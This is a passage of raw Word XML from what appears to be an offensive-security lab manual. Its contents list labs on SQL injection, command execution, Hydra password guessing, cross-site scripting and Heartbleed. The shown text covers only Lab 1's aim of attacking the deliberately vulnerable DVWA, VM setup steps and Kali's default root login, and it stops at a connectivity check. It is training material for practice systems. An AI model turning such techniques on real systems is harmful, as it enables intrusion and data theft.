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Toc21001230" w:displacedByCustomXml="next"/>
    <w:bookmarkStart w:id="1" w:name="_Toc521514439" w:displacedByCustomXml="next"/>
    <w:sdt>
      <w:sdtPr>
        <w:id w:val="-689145232"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtContent>
        <w:p w14:paraId="702A403E" w14:textId="2D3F2B8D" w:rsidR="0023150F" w:rsidRPr="0023150F" w:rsidRDefault="0023150F">
          <w:r w:rsidRPr="0023150F">
            <w:t>Contents</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="7E4469D4" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="0023150F" w:rsidRDefault="0023150F">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
          </w:pPr>
          <w:r w:rsidRPr="0023150F">
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidRPr="0023150F">
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r w:rsidRPr="0023150F">
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc24978027" w:history="1">
            <w:r w:rsidRPr="0023150F">
              <w:t>Lab 1: SQL Injection</w:t>
            </w:r>
            <w:r w:rsidRPr="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidRPr="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc24978027 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="219CD923" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="0023150F" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc24978028" w:history="1">
            <w:r w:rsidR="0023150F" w:rsidRPr="0023150F">
              <w:t>Lab 2: Command Execution</w:t>
            </w:r>
            <w:r w:rsidR="0023150F" w:rsidRPr="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="0023150F" w:rsidRPr="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc24978028 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1942D594" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="0023150F" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc24978029" w:history="1">
            <w:r w:rsidR="0023150F" w:rsidRPr="0023150F">
              <w:t>Lab 3: Dictionary Attack using Hydra</w:t>
            </w:r>
            <w:r w:rsidR="0023150F" w:rsidRPr="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="0023150F" w:rsidRPr="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc24978029 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="34085BA5" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="0023150F" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc24978030" w:history="1">
            <w:r w:rsidR="0023150F" w:rsidRPr="0023150F">
              <w:t>Lab 4: Cross-Site Scripting Attack</w:t>
            </w:r>
            <w:r w:rsidR="0023150F" w:rsidRPr="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="0023150F" w:rsidRPr="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc24978030 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3FB08A5B" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="0023150F" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc24978031" w:history="1">
            <w:r w:rsidR="0023150F" w:rsidRPr="0023150F">
              <w:t>Lab 5: Exploiting the Heartbleed Bug</w:t>
            </w:r>
            <w:r w:rsidR="0023150F" w:rsidRPr="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="0023150F" w:rsidRPr="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc24978031 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r w:rsidR="0023150F">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1FEF7B11" w14:textId="72B88E7C" w:rsidR="0023150F" w:rsidRPr="0023150F" w:rsidRDefault="0023150F">
          <w:r w:rsidRPr="0023150F">
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="47EF7A31" w14:textId="285C1178" w:rsidR="001F4164" w:rsidRDefault="001F4164" w:rsidP="007E0EF4">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH1Module"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc24978027"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Lab 1: SQL Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="6615CB6B" w14:textId="77777777" w:rsidR="001F4164" w:rsidRDefault="001F4164" w:rsidP="001F4164">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="007F7488">
        <w:t>Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D29B57D" w14:textId="70F7FE42" w:rsidR="001F4164" w:rsidRDefault="001F4164" w:rsidP="001F4164">
      <w:r>
        <w:t>The objective of this exercise is to perform a</w:t>
      </w:r>
      <w:r w:rsidR="00D848F3">
        <w:t xml:space="preserve">n SQL Injection </w:t>
      </w:r>
      <w:r>
        <w:t>attack on the DVWA website.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="742472A5" w14:textId="77777777" w:rsidR="001F4164" w:rsidRDefault="001F4164" w:rsidP="001F4164"/>
    <w:p w14:paraId="354F160F" w14:textId="77777777" w:rsidR="001F4164" w:rsidRDefault="001F4164" w:rsidP="001F4164">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:t>Resources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360E0981" w14:textId="77777777" w:rsidR="001F4164" w:rsidRDefault="001F4164" w:rsidP="001F4164">
      <w:r>
        <w:t xml:space="preserve">For this exercise you will need the </w:t>
      </w:r>
      <w:r w:rsidRPr="00521A74">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali VM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00521A74">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00521A74">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve"> VM</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="538F5B5A" w14:textId="77777777" w:rsidR="001F4164" w:rsidRDefault="001F4164" w:rsidP="001F4164"/>
    <w:p w14:paraId="3DB05C18" w14:textId="77777777" w:rsidR="001F4164" w:rsidRDefault="001F4164" w:rsidP="001F4164">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="007F7488">
        <w:t>Overview</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C9DABD" w14:textId="77777777" w:rsidR="001F4164" w:rsidRPr="00825763" w:rsidRDefault="001F4164" w:rsidP="001F4164">
      <w:r>
        <w:t xml:space="preserve">You will be attacking a Linux machine named </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, running the Damn Vulnerable Web App (DVWA). The DVWA is an </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>open source</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> web app written to be vulnerable to a host of different security exploits, designed for security professionals to practice their skills and conduct research.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D94C38" w14:textId="0BE9157C" w:rsidR="001F4164" w:rsidRDefault="001F4164" w:rsidP="001F4164">
      <w:r>
        <w:t>We will be attempting a</w:t>
      </w:r>
      <w:r w:rsidR="00425CE4">
        <w:t xml:space="preserve">n SQL injection </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">attack </w:t>
      </w:r>
      <w:r w:rsidR="00432FB2">
        <w:t xml:space="preserve">using just the web browser, in order </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r w:rsidR="00425CE4">
        <w:t>trick</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="00425CE4">
        <w:t>back-end MySQL database</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> server to execute </w:t>
      </w:r>
      <w:r w:rsidR="00425CE4">
        <w:t>queries that were injected by us and thus gain access to data that we should not be allowed to access otherwise</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564DC5BA" w14:textId="77777777" w:rsidR="001F4164" w:rsidRDefault="001F4164" w:rsidP="001F4164">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00A7520E" w14:textId="77777777" w:rsidR="001F4164" w:rsidRDefault="001F4164" w:rsidP="001F4164">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="007F7488">
        <w:t xml:space="preserve">Step 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Load the Virtual Machines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E03A2A0" w14:textId="77777777" w:rsidR="001F4164" w:rsidRDefault="001F4164" w:rsidP="001F4164">
      <w:r>
        <w:t>Navigate to your desktop and double click the Hyper-V Manager icon to start the VM manager.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C82AF2A" w14:textId="77777777" w:rsidR="001F4164" w:rsidRPr="00825763" w:rsidRDefault="001F4164" w:rsidP="001F4164">
      <w:r w:rsidRPr="001F4164">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1C86B7D6" wp14:editId="7747592A">
            <wp:extent cx="507815" cy="553980"/>
            <wp:effectExtent l="0" t="0" r="635"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01.PNG"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="517835" cy="564911"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F3B8F0B" w14:textId="7EB54B1A" w:rsidR="005B2127" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r>
        <w:t xml:space="preserve">Start up the </w:t>
      </w:r>
      <w:r w:rsidRPr="005B2127">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali VM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> by double-click on it in the list and press "Start" in the window that will appear.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AEB6EF1" w14:textId="77777777" w:rsidR="005B2127" w:rsidRPr="00645495" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r w:rsidRPr="003F45C1">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251952128" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="61195678" wp14:editId="2417135C">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>73660</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>505191</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="459258" cy="353746"/>
                <wp:effectExtent l="50800" t="25400" r="36195" b="78105"/>
                <wp:wrapNone/>
                <wp:docPr id="3" name="Straight Arrow Connector 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvCnPr/>
                      <wps:spPr>
                        <a:xfrm flipV="1">
                          <a:off x="0" y="0"/>
                          <a:ext cx="459258" cy="353746"/>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182507E" id="_x0000_t32" coordsize="21600,21600" o:spt="32" o:oned="t" path="m,l21600,21600e" filled="f">
                <v:path arrowok="t" fillok="f" o:connecttype="none"/>
                <o:lock v:ext="edit" shapetype="t"/>
              </v:shapetype>
              <v:shape id="Straight Arrow Connector 3" o:spid="_x0000_s1026" type="#_x0000_t32" style="position:absolute;margin-left:5.8pt;margin-top:39.8pt;width:36.15pt;height:27.85pt;flip:y;z-index:25195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" strokecolor="#ca1e17 [3205]" strokeweight="2pt">
                <v:stroke endarrow="block"/>
                <v:shadow on="t" color="black" opacity="24903f" origin=",.5" offset="0,.55556mm"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="003F45C1">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="244E7B21" wp14:editId="2D85F835">
            <wp:extent cx="3704321" cy="2246266"/>
            <wp:effectExtent l="0" t="0" r="4445"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03.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720161" cy="2255871"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="550BD423" w14:textId="77777777" w:rsidR="005B2127" w:rsidRPr="00346488" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r w:rsidRPr="00571218">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D63295" w14:textId="0C0F124B" w:rsidR="005B2127" w:rsidRPr="00901394" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r w:rsidRPr="00901394">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">To boot the </w:t>
      </w:r>
      <w:r w:rsidRPr="005B2127">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali VM</w:t>
      </w:r>
      <w:r w:rsidRPr="00901394">
        <w:t>, either wait for a few seconds or hit Enter when prompted to select Kali GNU/Linux from the GRUB menu; we do not require advanced options, just a standard Kali Linux Build.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="515F5F3C" w14:textId="77777777" w:rsidR="005B2127" w:rsidRPr="00825763" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r w:rsidRPr="005B2127">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="47000491" wp14:editId="5E1798F8">
            <wp:extent cx="3634548" cy="2725911"/>
            <wp:effectExtent l="0" t="0" r="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645689" cy="2734267"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D56A38" w14:textId="77777777" w:rsidR="005B2127" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r>
        <w:t>When the VM finishes booting up, login to the root account (Linux version of “Admin”) using the credentials below:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6058D5FC" w14:textId="77777777" w:rsidR="005B2127" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r>
        <w:t>Username:</w:t>
      </w:r>
      <w:r w:rsidRPr="005D5B42">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve"> root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B16171D" w14:textId="77777777" w:rsidR="005B2127" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r>
        <w:t>Password:</w:t>
      </w:r>
      <w:r w:rsidRPr="005D5B42">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005D5B42">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>toor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5BC2CE94" w14:textId="77777777" w:rsidR="005B2127" w:rsidRDefault="005B2127" w:rsidP="005B2127"/>
    <w:p w14:paraId="298182F6" w14:textId="4E1A2323" w:rsidR="005B2127" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r>
        <w:t xml:space="preserve">You should now be presented with the desktop. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6889DF85" w14:textId="77777777" w:rsidR="005B2127" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r w:rsidRPr="005B2127">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="550D13BB" wp14:editId="1D6EE21C">
            <wp:extent cx="4710313" cy="3098181"/>
            <wp:effectExtent l="0" t="0" r="1905"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05.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733712" cy="3113571"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C50EE73" w14:textId="393D85D0" w:rsidR="005B2127" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r w:rsidRPr="00337059">
        <w:t xml:space="preserve">Go back to the Hyper-V Manager and load the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004F69FA">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004F69FA">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve"> VM</w:t>
      </w:r>
      <w:r w:rsidRPr="00337059">
        <w:t xml:space="preserve"> by double clicking it from the list of VMs.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D8724B" w14:textId="0C73FCF2" w:rsidR="005B2127" w:rsidRPr="00337059" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">NOTE: </w:t>
      </w:r>
      <w:r w:rsidRPr="006562FC">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>You don't need to login to this VM, just wait for it to load up then minimise the window so that it will run in the back</w:t>
      </w:r>
      <w:r w:rsidR="00807767">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r w:rsidRPr="006562FC">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>round.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A569C8" w14:textId="77777777" w:rsidR="005B2127" w:rsidRPr="00337059" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r w:rsidRPr="005B2127">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251950080" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2590A9CB" wp14:editId="480CEEEF">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>148206</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>790057</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="750410" cy="376518"/>
                <wp:effectExtent l="50800" t="38100" r="24765" b="81280"/>
                <wp:wrapNone/>
                <wp:docPr id="4" name="Straight Arrow Connector 4"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvCnPr/>
                      <wps:spPr>
                        <a:xfrm flipV="1">
                          <a:off x="0" y="0"/>
                          <a:ext cx="750410" cy="376518"/>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1F21EF2" id="Straight Arrow Connector 4" o:spid="_x0000_s1026" type="#_x0000_t32" style="position:absolute;margin-left:11.65pt;margin-top:62.2pt;width:59.1pt;height:29.65pt;flip:y;z-index:25195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" strokecolor="#ca1e17 [3205]" strokeweight="2pt">
                <v:stroke endarrow="block"/>
                <v:shadow on="t" color="black" opacity="24903f" origin=",.5" offset="0,.55556mm"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="00337059">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005B2127">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="457C304E" wp14:editId="54C19DAF">
            <wp:extent cx="5219422" cy="3151472"/>
            <wp:effectExtent l="0" t="0" r="63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04.PNG"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId15">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5227252" cy="3156200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6707C96B" w14:textId="3D12D3F5" w:rsidR="00EC3737" w:rsidRDefault="00EC3737" w:rsidP="005B2127"/>
    <w:p w14:paraId="165A27F6" w14:textId="4A1C6F72" w:rsidR="00D94348" w:rsidRDefault="00D94348" w:rsidP="00D94348">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:t>Step 2: Check connectivity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D802E3" w14:textId="22CB299A" w:rsidR="005B2127" w:rsidRPr="005B6158" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r w:rsidRPr="005B6158">
        <w:t xml:space="preserve">Go back to </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidRPr="00EC3737">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali Linux VM</w:t>
      </w:r>
      <w:r w:rsidRPr="005B6158">
        <w:t xml:space="preserve"> and click on the Terminal icon on the left-hand sidebar to launch a Terminal window.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF38127" w14:textId="77777777" w:rsidR="005B2127" w:rsidRPr="005B6158" w:rsidRDefault="005B2127" w:rsidP="005B2127">
      <w:r w:rsidRPr="005B2127">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
